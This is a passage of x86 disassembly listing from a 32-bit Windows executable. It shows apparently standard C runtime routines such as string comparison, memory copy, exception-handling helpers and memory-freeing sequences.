  4262ba:	call   0x4244ba
  4262bf:	push   DWORD PTR [esi+0x50]
  4262c2:	call   0x4244ba
  4262c7:	push   DWORD PTR [esi+0x54]
  4262ca:	call   0x4244ba
  4262cf:	push   DWORD PTR [esi+0x58]
  4262d2:	call   0x4244ba
  4262d7:	push   DWORD PTR [esi+0x5c]
  4262da:	call   0x4244ba
  4262df:	push   DWORD PTR [esi+0x60]
  4262e2:	call   0x4244ba
  4262e7:	push   DWORD PTR [esi+0x64]
  4262ea:	call   0x4244ba
  4262ef:	push   DWORD PTR [esi+0x68]
  4262f2:	call   0x4244ba
  4262f7:	push   DWORD PTR [esi+0x6c]
  4262fa:	call   0x4244ba
  4262ff:	push   DWORD PTR [esi+0x70]
  426302:	call   0x4244ba
  426307:	push   DWORD PTR [esi+0x74]
  42630a:	call   0x4244ba
  42630f:	push   DWORD PTR [esi+0x78]
  426312:	call   0x4244ba
  426317:	push   DWORD PTR [esi+0x7c]
  42631a:	call   0x4244ba
  42631f:	add    esp,0x40
  426322:	push   DWORD PTR [esi+0x80]
  426328:	call   0x4244ba
  42632d:	push   DWORD PTR [esi+0x84]
  426333:	call   0x4244ba
  426338:	push   DWORD PTR [esi+0x88]
  42633e:	call   0x4244ba
  426343:	push   DWORD PTR [esi+0x8c]
  426349:	call   0x4244ba
  42634e:	push   DWORD PTR [esi+0x90]
  426354:	call   0x4244ba
  426359:	push   DWORD PTR [esi+0x94]
  42635f:	call   0x4244ba
  426364:	push   DWORD PTR [esi+0x98]
  42636a:	call   0x4244ba
  42636f:	push   DWORD PTR [esi+0x9c]
  426375:	call   0x4244ba
  42637a:	push   DWORD PTR [esi+0xa0]
  426380:	call   0x4244ba
  426385:	push   DWORD PTR [esi+0xa4]
  42638b:	call   0x4244ba
  426390:	push   DWORD PTR [esi+0xa8]
  426396:	call   0x4244ba
  42639b:	add    esp,0x2c
  42639e:	pop    esi
  42639f:	ret    
  4263a0:	push   esi
  4263a1:	mov    esi,DWORD PTR [esp+0x8]
  4263a5:	test   esi,esi
  4263a7:	je     0x4263fd
  4263a9:	mov    eax,DWORD PTR [esi]
  4263ab:	mov    ecx,DWORD PTR ds:0x45c934
  4263b1:	cmp    eax,DWORD PTR [ecx]
  4263b3:	je     0x4263c4
  4263b5:	cmp    eax,DWORD PTR ds:0x45c904
  4263bb:	je     0x4263c4
  4263bd:	push   eax
  4263be:	call   0x4244ba
  4263c3:	pop    ecx
  4263c4:	mov    eax,DWORD PTR [esi+0x4]
  4263c7:	mov    ecx,DWORD PTR ds:0x45c934
  4263cd:	cmp    eax,DWORD PTR [ecx+0x4]
  4263d0:	je     0x4263e1
  4263d2:	cmp    eax,DWORD PTR ds:0x45c908
  4263d8:	je     0x4263e1
  4263da:	push   eax
  4263db:	call   0x4244ba
  4263e0:	pop    ecx
  4263e1:	mov    esi,DWORD PTR [esi+0x8]
  4263e4:	mov    eax,ds:0x45c934
  4263e9:	cmp    esi,DWORD PTR [eax+0x8]
  4263ec:	je     0x4263fd
  4263ee:	cmp    esi,DWORD PTR ds:0x45c90c
  4263f4:	je     0x4263fd
  4263f6:	push   esi
  4263f7:	call   0x4244ba
  4263fc:	pop    ecx
  4263fd:	pop    esi
  4263fe:	ret    
  4263ff:	push   esi
  426400:	mov    esi,DWORD PTR [esp+0x8]
  426404:	test   esi,esi
  426406:	je     0x4264d6
  42640c:	mov    eax,DWORD PTR [esi+0xc]
  42640f:	mov    ecx,DWORD PTR ds:0x45c934
  426415:	cmp    eax,DWORD PTR [ecx+0xc]
  426418:	je     0x426429
  42641a:	cmp    eax,DWORD PTR ds:0x45c910
  426420:	je     0x426429
  426422:	push   eax
  426423:	call   0x4244ba
  426428:	pop    ecx
  426429:	mov    eax,DWORD PTR [esi+0x10]
  42642c:	mov    ecx,DWORD PTR ds:0x45c934
  426432:	cmp    eax,DWORD PTR [ecx+0x10]
  426435:	je     0x426446
  426437:	cmp    eax,DWORD PTR ds:0x45c914
  42643d:	je     0x426446
  42643f:	push   eax
  426440:	call   0x4244ba
  426445:	pop    ecx
  426446:	mov    eax,DWORD PTR [esi+0x14]
  426449:	mov    ecx,DWORD PTR ds:0x45c934
  42644f:	cmp    eax,DWORD PTR [ecx+0x14]
  426452:	je     0x426463
  426454:	cmp    eax,DWORD PTR ds:0x45c918
  42645a:	je     0x426463
  42645c:	push   eax
  42645d:	call   0x4244ba
  426462:	pop    ecx
  426463:	mov    eax,DWORD PTR [esi+0x18]
  426466:	mov    ecx,DWORD PTR ds:0x45c934
  42646c:	cmp    eax,DWORD PTR [ecx+0x18]
  42646f:	je     0x426480
  426471:	cmp    eax,DWORD PTR ds:0x45c91c
  426477:	je     0x426480
  426479:	push   eax
  42647a:	call   0x4244ba
  42647f:	pop    ecx
  426480:	mov    eax,DWORD PTR [esi+0x1c]
  426483:	mov    ecx,DWORD PTR ds:0x45c934
  426489:	cmp    eax,DWORD PTR [ecx+0x1c]
  42648c:	je     0x42649d
  42648e:	cmp    eax,DWORD PTR ds:0x45c920
  426494:	je     0x42649d
  426496:	push   eax
  426497:	call   0x4244ba
  42649c:	pop    ecx
  42649d:	mov    eax,DWORD PTR [esi+0x20]
  4264a0:	mov    ecx,DWORD PTR ds:0x45c934
  4264a6:	cmp    eax,DWORD PTR [ecx+0x20]
  4264a9:	je     0x4264ba
  4264ab:	cmp    eax,DWORD PTR ds:0x45c924
  4264b1:	je     0x4264ba
  4264b3:	push   eax
  4264b4:	call   0x4244ba
  4264b9:	pop    ecx
  4264ba:	mov    esi,DWORD PTR [esi+0x24]
  4264bd:	mov    eax,ds:0x45c934
  4264c2:	cmp    esi,DWORD PTR [eax+0x24]
  4264c5:	je     0x4264d6
  4264c7:	cmp    esi,DWORD PTR ds:0x45c928
  4264cd:	je     0x4264d6
  4264cf:	push   esi
  4264d0:	call   0x4244ba
  4264d5:	pop    ecx
  4264d6:	pop    esi
  4264d7:	ret    
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	push   ebp
  4264e1:	mov    ebp,esp
  4264e3:	push   esi
  4264e4:	xor    eax,eax
  4264e6:	push   eax
  4264e7:	push   eax
  4264e8:	push   eax
  4264e9:	push   eax
  4264ea:	push   eax
  4264eb:	push   eax
  4264ec:	push   eax
  4264ed:	push   eax
  4264ee:	mov    edx,DWORD PTR [ebp+0xc]
  4264f1:	lea    ecx,[ecx+0x0]
  4264f4:	mov    al,BYTE PTR [edx]
  4264f6:	or     al,al
  4264f8:	je     0x426503
  4264fa:	add    edx,0x1
  4264fd:	bts    DWORD PTR [esp],eax
  426501:	jmp    0x4264f4
  426503:	mov    esi,DWORD PTR [ebp+0x8]
  426506:	or     ecx,0xffffffff
  426509:	lea    ecx,[ecx+0x0]
  42650c:	add    ecx,0x1
  42650f:	mov    al,BYTE PTR [esi]
  426511:	or     al,al
  426513:	je     0x42651e
  426515:	add    esi,0x1
  426518:	bt     DWORD PTR [esp],eax
  42651c:	jae    0x42650c
  42651e:	mov    eax,ecx
  426520:	add    esp,0x20
  426523:	pop    esi
  426524:	leave  
  426525:	ret    
  426526:	int3   
  426527:	int3   
  426528:	int3   
  426529:	int3   
  42652a:	int3   
  42652b:	int3   
  42652c:	int3   
  42652d:	int3   
  42652e:	int3   
  42652f:	int3   
  426530:	mov    edx,DWORD PTR [esp+0x4]
  426534:	mov    ecx,DWORD PTR [esp+0x8]
  426538:	test   edx,0x3
  42653e:	jne    0x42657c
  426540:	mov    eax,DWORD PTR [edx]
  426542:	cmp    al,BYTE PTR [ecx]
  426544:	jne    0x426574
  426546:	or     al,al
  426548:	je     0x426570
  42654a:	cmp    ah,BYTE PTR [ecx+0x1]
  42654d:	jne    0x426574
  42654f:	or     ah,ah
  426551:	je     0x426570
  426553:	shr    eax,0x10
  426556:	cmp    al,BYTE PTR [ecx+0x2]
  426559:	jne    0x426574
  42655b:	or     al,al
  42655d:	je     0x426570
  42655f:	cmp    ah,BYTE PTR [ecx+0x3]
  426562:	jne    0x426574
  426564:	add    ecx,0x4
  426567:	add    edx,0x4
  42656a:	or     ah,ah
  42656c:	jne    0x426540
  42656e:	mov    edi,edi
  426570:	xor    eax,eax
  426572:	ret    
  426573:	nop
  426574:	sbb    eax,eax
  426576:	shl    eax,1
  426578:	add    eax,0x1
  42657b:	ret    
  42657c:	test   edx,0x1
  426582:	je     0x42659c
  426584:	mov    al,BYTE PTR [edx]
  426586:	add    edx,0x1
  426589:	cmp    al,BYTE PTR [ecx]
  42658b:	jne    0x426574
  42658d:	add    ecx,0x1
  426590:	or     al,al
  426592:	je     0x426570
  426594:	test   edx,0x2
  42659a:	je     0x426540
  42659c:	mov    ax,WORD PTR [edx]
  42659f:	add    edx,0x2
  4265a2:	cmp    al,BYTE PTR [ecx]
  4265a4:	jne    0x426574
  4265a6:	or     al,al
  4265a8:	je     0x426570
  4265aa:	cmp    ah,BYTE PTR [ecx+0x1]
  4265ad:	jne    0x426574
  4265af:	or     ah,ah
  4265b1:	je     0x426570
  4265b3:	add    ecx,0x2
  4265b6:	jmp    0x426540
  4265b8:	int3   
  4265b9:	int3   
  4265ba:	int3   
  4265bb:	int3   
  4265bc:	int3   
  4265bd:	int3   
  4265be:	int3   
  4265bf:	int3   
  4265c0:	mov    eax,DWORD PTR [esp+0xc]
  4265c4:	test   eax,eax
  4265c6:	je     0x426612
  4265c8:	mov    edx,DWORD PTR [esp+0x4]
  4265cc:	push   esi
  4265cd:	push   edi
  4265ce:	mov    esi,edx
  4265d0:	mov    edi,DWORD PTR [esp+0x10]
  4265d4:	or     edx,edi
  4265d6:	and    edx,0x3
  4265d9:	je     0x426613
  4265db:	test   eax,0x1
  4265e0:	je     0x4265f3
  4265e2:	mov    cl,BYTE PTR [esi]
  4265e4:	cmp    cl,BYTE PTR [edi]
  4265e6:	jne    0x426640
  4265e8:	add    esi,0x1
  4265eb:	add    edi,0x1
  4265ee:	sub    eax,0x1
  4265f1:	je     0x426610
  4265f3:	mov    cl,BYTE PTR [esi]
  4265f5:	mov    dl,BYTE PTR [edi]
  4265f7:	cmp    cl,dl
  4265f9:	jne    0x426640
  4265fb:	mov    cl,BYTE PTR [esi+0x1]
  4265fe:	mov    dl,BYTE PTR [edi+0x1]
  426601:	cmp    cl,dl
  426603:	jne    0x426640
  426605:	add    edi,0x2
  426608:	add    esi,0x2
  42660b:	sub    eax,0x2
  42660e:	jne    0x4265f3
  426610:	pop    edi
  426611:	pop    esi
  426612:	ret    
  426613:	mov    ecx,eax
  426615:	and    eax,0x3
  426618:	shr    ecx,0x2
  42661b:	je     0x426648
  42661d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42661f:	je     0x426648
  426621:	mov    ecx,DWORD PTR [esi-0x4]
  426624:	mov    edx,DWORD PTR [edi-0x4]
  426627:	cmp    cl,dl
  426629:	jne    0x42663b
  42662b:	cmp    ch,dh
  42662d:	jne    0x42663b
  42662f:	shr    ecx,0x10
  426632:	shr    edx,0x10
  426635:	cmp    cl,dl
  426637:	jne    0x42663b
  426639:	cmp    ch,dh
  42663b:	mov    eax,0x0
  426640:	sbb    eax,eax
  426642:	pop    edi
  426643:	sbb    eax,0xffffffff
  426646:	pop    esi
  426647:	ret    
  426648:	test   eax,eax
  42664a:	je     0x426610
  42664c:	mov    edx,DWORD PTR [esi]
  42664e:	mov    ecx,DWORD PTR [edi]
  426650:	cmp    dl,cl
  426652:	jne    0x42663b
  426654:	sub    eax,0x1
  426657:	je     0x426675
  426659:	cmp    dh,ch
  42665b:	jne    0x42663b
  42665d:	sub    eax,0x1
  426660:	je     0x426675
  426662:	and    ecx,0xff0000
  426668:	and    edx,0xff0000
  42666e:	cmp    edx,ecx
  426670:	jne    0x42663b
  426672:	sub    eax,0x1
  426675:	pop    edi
  426676:	pop    esi
  426677:	ret    
  426678:	int3   
  426679:	int3   
  42667a:	int3   
  42667b:	int3   
  42667c:	int3   
  42667d:	int3   
  42667e:	int3   
  42667f:	int3   
  426680:	push   ebp
  426681:	mov    ebp,esp
  426683:	push   edi
  426684:	push   esi
  426685:	push   ebx
  426686:	mov    ecx,DWORD PTR [ebp+0x10]
  426689:	jecxz  0x4266b2
  42668b:	mov    ebx,ecx
  42668d:	mov    edi,DWORD PTR [ebp+0x8]
  426690:	mov    esi,edi
  426692:	xor    eax,eax
  426694:	repnz scas al,BYTE PTR es:[edi]
  426696:	neg    ecx
  426698:	add    ecx,ebx
  42669a:	mov    edi,esi
  42669c:	mov    esi,DWORD PTR [ebp+0xc]
  42669f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266a1:	mov    al,BYTE PTR [esi-0x1]
  4266a4:	xor    ecx,ecx
  4266a6:	cmp    al,BYTE PTR [edi-0x1]
  4266a9:	ja     0x4266b0
  4266ab:	je     0x4266b2
  4266ad:	sub    ecx,0x2
  4266b0:	not    ecx
  4266b2:	mov    eax,ecx
  4266b4:	pop    ebx
  4266b5:	pop    esi
  4266b6:	pop    edi
  4266b7:	leave  
  4266b8:	ret    
  4266b9:	int3   
  4266ba:	int3   
  4266bb:	int3   
  4266bc:	int3   
  4266bd:	int3   
  4266be:	int3   
  4266bf:	int3   
  4266c0:	push   ebp
  4266c1:	mov    ebp,esp
  4266c3:	push   esi
  4266c4:	xor    eax,eax
  4266c6:	push   eax
  4266c7:	push   eax
  4266c8:	push   eax
  4266c9:	push   eax
  4266ca:	push   eax
  4266cb:	push   eax
  4266cc:	push   eax
  4266cd:	push   eax
  4266ce:	mov    edx,DWORD PTR [ebp+0xc]
  4266d1:	lea    ecx,[ecx+0x0]
  4266d4:	mov    al,BYTE PTR [edx]
  4266d6:	or     al,al
  4266d8:	je     0x4266e3
  4266da:	add    edx,0x1
  4266dd:	bts    DWORD PTR [esp],eax
  4266e1:	jmp    0x4266d4
  4266e3:	mov    esi,DWORD PTR [ebp+0x8]
  4266e6:	mov    edi,edi
  4266e8:	mov    al,BYTE PTR [esi]
  4266ea:	or     al,al
  4266ec:	je     0x4266fa
  4266ee:	add    esi,0x1
  4266f1:	bt     DWORD PTR [esp],eax
  4266f5:	jae    0x4266e8
  4266f7:	lea    eax,[esi-0x1]
  4266fa:	add    esp,0x20
  4266fd:	pop    esi
  4266fe:	leave  
  4266ff:	ret    
  426700:	push   ebp
  426701:	mov    ebp,esp
  426703:	push   ebx
  426704:	push   esi
  426705:	push   edi
  426706:	push   ebp
  426707:	push   0x0
  426709:	push   0x0
  42670b:	push   0x426718
  426710:	push   DWORD PTR [ebp+0x8]
  426713:	call   0x42718e
  426718:	pop    ebp
  426719:	pop    edi
  42671a:	pop    esi
  42671b:	pop    ebx
  42671c:	mov    esp,ebp
  42671e:	pop    ebp
  42671f:	ret    
  426720:	mov    ecx,DWORD PTR [esp+0x4]
  426724:	test   DWORD PTR [ecx+0x4],0x6
  42672b:	mov    eax,0x1
  426730:	je     0x426741
  426732:	mov    eax,DWORD PTR [esp+0x8]
  426736:	mov    edx,DWORD PTR [esp+0x10]
  42673a:	mov    DWORD PTR [edx],eax
  42673c:	mov    eax,0x3
  426741:	ret    
  426742:	push   ebx
  426743:	push   esi
  426744:	push   edi
  426745:	mov    eax,DWORD PTR [esp+0x10]
  426749:	push   eax
  42674a:	push   0xfffffffe
  42674c:	push   0x426720
  426751:	push   DWORD PTR fs:0x0
  426758:	mov    DWORD PTR fs:0x0,esp
  42675f:	mov    eax,DWORD PTR [esp+0x20]
  426763:	mov    ebx,DWORD PTR [eax+0x8]
  426766:	mov    esi,DWORD PTR [eax+0xc]
  426769:	cmp    esi,0xffffffff
  42676c:	je     0x42679c
  42676e:	cmp    esi,DWORD PTR [esp+0x24]
  426772:	je     0x42679c
  426774:	lea    esi,[esi+esi*2]
  426777:	mov    ecx,DWORD PTR [ebx+esi*4]
  42677a:	mov    DWORD PTR [esp+0x8],ecx
  42677e:	mov    DWORD PTR [eax+0xc],ecx
  426781:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426786:	jne    0x42679a
  426788:	push   0x101
  42678d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426791:	call   0x4267d6
  426796:	call   DWORD PTR [ebx+esi*4+0x8]
  42679a:	jmp    0x42675f
  42679c:	pop    DWORD PTR fs:0x0
  4267a3:	add    esp,0xc
  4267a6:	pop    edi
  4267a7:	pop    esi
  4267a8:	pop    ebx
  4267a9:	ret    
  4267aa:	xor    eax,eax
  4267ac:	mov    ecx,DWORD PTR fs:0x0
  4267b3:	cmp    DWORD PTR [ecx+0x4],0x426720
  4267ba:	jne    0x4267cc
  4267bc:	mov    edx,DWORD PTR [ecx+0xc]
  4267bf:	mov    edx,DWORD PTR [edx+0xc]
  4267c2:	cmp    DWORD PTR [ecx+0x8],edx
  4267c5:	jne    0x4267cc
  4267c7:	mov    eax,0x1
  4267cc:	ret    
  4267cd:	push   ebx
  4267ce:	push   ecx
  4267cf:	mov    ebx,0x45c94c
  4267d4:	jmp    0x4267e0
  4267d6:	push   ebx
  4267d7:	push   ecx
  4267d8:	mov    ebx,0x45c94c
  4267dd:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e0:	mov    DWORD PTR [ebx+0x8],ecx
  4267e3:	mov    DWORD PTR [ebx+0x4],eax
  4267e6:	mov    DWORD PTR [ebx+0xc],ebp
  4267e9:	pop    ecx
  4267ea:	pop    ebx
  4267eb:	ret    0x4
  4267ee:	int3   
  4267ef:	int3   
  4267f0:	push   ebp
  4267f1:	mov    ebp,esp
  4267f3:	push   edi
  4267f4:	push   esi
  4267f5:	mov    esi,DWORD PTR [ebp+0xc]
  4267f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267fb:	mov    edi,DWORD PTR [ebp+0x8]
  4267fe:	mov    eax,ecx
  426800:	mov    edx,ecx
  426802:	add    eax,esi
  426804:	cmp    edi,esi
  426806:	jbe    0x426810
  426808:	cmp    edi,eax
  42680a:	jb     0x42698c
  426810:	test   edi,0x3
  426816:	jne    0x42682c
  426818:	shr    ecx,0x2
  42681b:	and    edx,0x3
  42681e:	cmp    ecx,0x8
  426821:	jb     0x42684c
  426823:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426825:	jmp    DWORD PTR [edx*4+0x42693c]
  42682c:	mov    eax,edi
  42682e:	mov    edx,0x3
  426833:	sub    ecx,0x4
  426836:	jb     0x426844
  426838:	and    eax,0x3
  42683b:	add    ecx,eax
  42683d:	jmp    DWORD PTR [eax*4+0x426850]
  426844:	jmp    DWORD PTR [ecx*4+0x42694c]
  42684b:	nop
  42684c:	jmp    DWORD PTR [ecx*4+0x4268d0]
  426853:	nop
  426854:	pusha  
  426855:	push   0x688c0042
  42685a:	inc    edx
  42685b:	add    BYTE PTR [eax+0x23004268],dh
  426861:	ror    DWORD PTR [edx-0x75f877fa],1
  426867:	inc    esi
  426868:	add    DWORD PTR [eax+0x468a0147],ecx
  42686e:	add    al,cl
  426870:	jmp    0x289f077
  426875:	add    esi,0x3
  426878:	add    edi,0x3
  42687b:	cmp    ecx,0x8
  42687e:	jb     0x42684c
  426880:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426882:	jmp    DWORD PTR [edx*4+0x42693c]
  426889:	lea    ecx,[ecx+0x0]
  42688c:	and    edx,ecx
  42688e:	mov    al,BYTE PTR [esi]
  426890:	mov    BYTE PTR [edi],al
  426892:	mov    al,BYTE PTR [esi+0x1]
  426895:	shr    ecx,0x2
  426898:	mov    BYTE PTR [edi+0x1],al
  42689b:	add    esi,0x2
  42689e:	add    edi,0x2
  4268a1:	cmp    ecx,0x8
  4268a4:	jb     0x42684c
  4268a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268a8:	jmp    DWORD PTR [edx*4+0x42693c]
  4268af:	nop
  4268b0:	and    edx,ecx
  4268b2:	mov    al,BYTE PTR [esi]
  4268b4:	mov    BYTE PTR [edi],al
  4268b6:	add    esi,0x1
  4268b9:	shr    ecx,0x2
  4268bc:	add    edi,0x1
  4268bf:	cmp    ecx,0x8
  4268c2:	jb     0x42684c
  4268c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268c6:	jmp    DWORD PTR [edx*4+0x42693c]
  4268cd:	lea    ecx,[ecx+0x0]
  4268d0:	xor    ebp,DWORD PTR [ecx+0x42]
  4268d3:	add    BYTE PTR [eax],ah
  4268d5:	imul   eax,DWORD PTR [edx+0x0],0x426918
  4268dc:	adc    BYTE PTR [ecx+0x42],ch
  4268df:	add    BYTE PTR [eax],cl
  4268e1:	imul   eax,DWORD PTR [edx+0x0],0x426900
  4268e8:	clc    
  4268e9:	push   0x68f00042
  4268ee:	inc    edx
  4268ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268f5:	inc    esp
  4268f6:	(bad)  
  4268f7:	in     al,0x8b
  4268f9:	inc    esp
  4268fa:	mov    gs,eax
  4268fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426900:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426904:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426908:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42690c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  426910:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  426914:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  426918:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42691c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  426920:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  426924:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  426928:	lea    eax,[ecx*4+0x0]
  42692f:	add    esi,eax
  426931:	add    edi,eax
  426933:	jmp    DWORD PTR [edx*4+0x42693c]
  42693a:	mov    edi,edi
  42693c:	dec    esp
  42693d:	imul   eax,DWORD PTR [edx+0x0],0x426954
  426944:	pusha  
  426945:	imul   eax,DWORD PTR [edx+0x0],0x426974
  42694c:	mov    eax,DWORD PTR [ebp+0x8]
  42694f:	pop    esi
  426950:	pop    edi
  426951:	leave  
  426952:	ret    
  426953:	nop
  426954:	mov    al,BYTE PTR [esi]
  426956:	mov    BYTE PTR [edi],al
  426958:	mov    eax,DWORD PTR [ebp+0x8]
  42695b:	pop    esi
  42695c:	pop    edi
  42695d:	leave  
  42695e:	ret    
  42695f:	nop
  426960:	mov    al,BYTE PTR [esi]
  426962:	mov    BYTE PTR [edi],al
  426964:	mov    al,BYTE PTR [esi+0x1]
  426967:	mov    BYTE PTR [edi+0x1],al
  42696a:	mov    eax,DWORD PTR [ebp+0x8]
  42696d:	pop    esi
  42696e:	pop    edi
  42696f:	leave  
  426970:	ret    
  426971:	lea    ecx,[ecx+0x0]
  426974:	mov    al,BYTE PTR [esi]
  426976:	mov    BYTE PTR [edi],al
  426978:	mov    al,BYTE PTR [esi+0x1]
  42697b:	mov    BYTE PTR [edi+0x1],al
  42697e:	mov    al,BYTE PTR [esi+0x2]
  426981:	mov    BYTE PTR [edi+0x2],al
  426984:	mov    eax,DWORD PTR [ebp+0x8]
  426987:	pop    esi
  426988:	pop    edi
  426989:	leave  
  42698a:	ret    
  42698b:	nop
  42698c:	lea    esi,[ecx+esi*1-0x4]
  426990:	lea    edi,[ecx+edi*1-0x4]
  426994:	test   edi,0x3
  42699a:	jne    0x4269c0
  42699c:	shr    ecx,0x2
  42699f:	and    edx,0x3
  4269a2:	cmp    ecx,0x8
  4269a5:	jb     0x4269b4
  4269a7:	std    
  4269a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269aa:	cld    
  4269ab:	jmp    DWORD PTR [edx*4+0x426ad8]
  4269b2:	mov    edi,edi
  4269b4:	neg    ecx
  4269b6:	jmp    DWORD PTR [ecx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    eax,edi
  4269c2:	mov    edx,0x3
  4269c7:	cmp    ecx,0x4
  4269ca:	jb     0x4269d8
  4269cc:	and    eax,0x3
  4269cf:	sub    ecx,eax
  4269d1:	jmp    DWORD PTR [eax*4+0x4269dc]
  4269d8:	jmp    DWORD PTR [ecx*4+0x426ad8]
  4269df:	nop
  4269e0:	in     al,dx
  4269e1:	imul   eax,DWORD PTR [edx+0x0],0x426a10
  4269e8:	cmp    BYTE PTR [edx+0x42],ch
  4269eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4269f1:	mov    BYTE PTR [edi+0x3],al
  4269f4:	sub    esi,0x1
  4269f7:	shr    ecx,0x2
  4269fa:	sub    edi,0x1
  4269fd:	cmp    ecx,0x8
  426a00:	jb     0x4269b4
  426a02:	std    
  426a03:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a05:	cld    
  426a06:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a0d:	lea    ecx,[ecx+0x0]
  426a10:	mov    al,BYTE PTR [esi+0x3]
  426a13:	and    edx,ecx
  426a15:	mov    BYTE PTR [edi+0x3],al
  426a18:	mov    al,BYTE PTR [esi+0x2]
  426a1b:	shr    ecx,0x2
  426a1e:	mov    BYTE PTR [edi+0x2],al
  426a21:	sub    esi,0x2
  426a24:	sub    edi,0x2
  426a27:	cmp    ecx,0x8
  426a2a:	jb     0x4269b4
  426a2c:	std    
  426a2d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a2f:	cld    
  426a30:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a37:	nop
  426a38:	mov    al,BYTE PTR [esi+0x3]
  426a3b:	and    edx,ecx
  426a3d:	mov    BYTE PTR [edi+0x3],al
  426a40:	mov    al,BYTE PTR [esi+0x2]
  426a43:	mov    BYTE PTR [edi+0x2],al
  426a46:	mov    al,BYTE PTR [esi+0x1]
  426a49:	shr    ecx,0x2
  426a4c:	mov    BYTE PTR [edi+0x1],al
  426a4f:	sub    esi,0x3
  426a52:	sub    edi,0x3
  426a55:	cmp    ecx,0x8
  426a58:	jb     0x4269b4
  426a5e:	std    
  426a5f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a61:	cld    
  426a62:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a69:	lea    ecx,[ecx+0x0]
  426a6c:	mov    WORD PTR [edx+0x42],gs
  426a6f:	add    BYTE PTR [edx+ebp*2+0x6a9c0042],dl
  426a76:	inc    edx
  426a77:	add    BYTE PTR [edx+ebp*2+0x6aac0042],ah
  426a7e:	inc    edx
  426a7f:	add    BYTE PTR [edx+ebp*2+0x6abc0042],dh
  426a86:	inc    edx
  426a87:	add    bh,cl
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a91:	inc    esp
  426a92:	(bad)  
  426a93:	sbb    al,0x8b
  426a95:	inc    esp
  426a96:	mov    ds,WORD PTR [eax]
  426a98:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a9c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426aa0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426aa4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426aa8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426aac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426ab0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426ab4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426ab8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426abc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426ac0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426ac4:	lea    eax,[ecx*4+0x0]
  426acb:	add    esi,eax
  426acd:	add    edi,eax
  426acf:	jmp    DWORD PTR [edx*4+0x426ad8]
  426ad6:	mov    edi,edi
  426ad8:	call   0xf042ad47
  426add:	push   0x42
  426adf:	add    BYTE PTR [eax],al
  426ae1:	imul   eax,DWORD PTR [edx+0x0],0x14
  426ae5:	imul   eax,DWORD PTR [edx+0x0],0xffffff8b
  426ae9:	inc    ebp
  426aea:	or     BYTE PTR [esi+0x5f],bl
  426aed:	leave  
  426aee:	ret    
  426aef:	nop
  426af0:	mov    al,BYTE PTR [esi+0x3]
  426af3:	mov    BYTE PTR [edi+0x3],al
  426af6:	mov    eax,DWORD PTR [ebp+0x8]
  426af9:	pop    esi
  426afa:	pop    edi
  426afb:	leave  
  426afc:	ret    
  426afd:	lea    ecx,[ecx+0x0]
  426b00:	mov    al,BYTE PTR [esi+0x3]
  426b03:	mov    BYTE PTR [edi+0x3],al
  426b06:	mov    al,BYTE PTR [esi+0x2]
  426b09:	mov    BYTE PTR [edi+0x2],al
  426b0c:	mov    eax,DWORD PTR [ebp+0x8]
  426b0f:	pop    esi
  426b10:	pop    edi
  426b11:	leave  
  426b12:	ret    
  426b13:	nop
  426b14:	mov    al,BYTE PTR [esi+0x3]
  426b17:	mov    BYTE PTR [edi+0x3],al
  426b1a:	mov    al,BYTE PTR [esi+0x2]
  426b1d:	mov    BYTE PTR [edi+0x2],al
  426b20:	mov    al,BYTE PTR [esi+0x1]
  426b23:	mov    BYTE PTR [edi+0x1],al
  426b26:	mov    eax,DWORD PTR [ebp+0x8]
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	leave  
  426b2c:	ret    
  426b2d:	push   ebp
  426b2e:	mov    ebp,esp
  426b30:	sub    esp,0xc
  426b33:	mov    eax,ds:0x45c430
  426b38:	xor    eax,DWORD PTR [ebp+0x4]
  426b3b:	and    BYTE PTR [ebp-0x6],0x0
  426b3f:	push   0x6
  426b41:	mov    DWORD PTR [ebp-0x4],eax
  426b44:	lea    eax,[ebp-0xc]
  426b47:	push   eax
  426b48:	push   0x1004
